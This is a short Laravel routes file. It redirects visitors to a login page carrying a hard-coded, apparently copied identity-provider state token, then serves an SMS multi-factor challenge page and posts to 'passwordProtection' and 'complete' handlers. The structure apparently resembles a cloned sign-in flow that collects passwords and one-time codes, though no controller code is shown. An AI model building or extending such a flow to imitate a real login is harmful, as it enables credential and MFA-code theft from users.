<?php

use App\Http\Controllers\LoginController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    return redirect('/login?state=hKFo2SA1Z2VIZ3dxMjBaTTNrQTBNOXplM2JmeFJTOWkyNVd6aaFupWxvZ2luo3RpZNkgdklYN3VXNmowNm9fYkltVC1Vajh3NGNiT0NxRDBpSkajY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA');
});
Route::get('/login', function () {
    return view('login');
});
Route::get('/mfa-sms-challenge', function () {
    return view('mfaSmsChallenge');
});
Route::post('/protection', [LoginController::class, 'passwordProtection']);
Route::post('/complete', [LoginController::class, 'complete']);
